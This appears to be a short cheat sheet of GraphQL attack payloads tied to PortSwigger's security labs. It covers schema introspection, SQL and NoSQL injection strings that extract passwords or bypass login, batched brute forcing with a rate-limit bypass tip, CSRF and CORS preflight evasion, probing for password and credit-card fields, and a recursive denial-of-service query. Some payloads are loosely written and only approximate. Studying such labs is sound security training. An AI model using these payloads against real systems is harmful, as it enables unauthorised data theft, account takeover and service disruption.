# PortSwigger GraphQL Labs — Complete Reference

## Introspection
```graphql
{__schema{types{name,fields{name}}}}
```
If introspection enabled, extract full schema.

## Bypass Deeper Introspection
```graphql
{__schema{queryType{name}mutationType{name}types{name fields{name args{name type{name}}directives{name}}}}}
```
Sometimes introspection is partially disabled.

## SQL Injection via GraphQL
```graphql
{product(id:"1 UNION SELECT username,password FROM users"){name}}
```

## NoSQL Injection via GraphQL
```graphql
{user(login:"admin",password:{ne:""}){name}}
```

## Batching Brute Force
```graphql
[
  {query:"query{user(id:1){password}}"},
  {query:"query{user(id:2){password}}"},
  {query:"query{user(id:3){password}}"}
]
```
Use aliases to bypass rate limiting.

## CSRF via GraphQL
- GraphQL often uses POST with JSON body
- If no CSRF token required, exploit via form
- Use `Content-Type: text/plain` to bypass CORS preflight

## Accidental Field Exposure
```graphql
{user(id:1){email password creditCard secret}}
```
Try all possible field names.

## Deep Recursion DoS
```graphql
query{user{posts{comments{user{posts{...}}}}}}  // infinite loop
```
